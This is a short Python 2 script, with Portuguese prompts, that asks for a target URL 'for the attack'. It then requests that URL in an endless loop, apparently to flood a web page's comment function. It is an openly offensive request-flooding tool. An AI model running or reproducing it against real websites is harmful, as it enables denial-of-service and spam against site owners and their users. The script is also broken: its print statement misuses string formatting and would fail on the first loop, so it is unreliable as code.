import urllib2

'''
The ID can be found in the source code of the page

Example: http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment
'''

target = raw_input("Informe a url com os parametros para o ataque: ")
count = 0

while True:
    count +=1
    print (count, "Enviando requisicao..." % urllib2.urlopen(target))
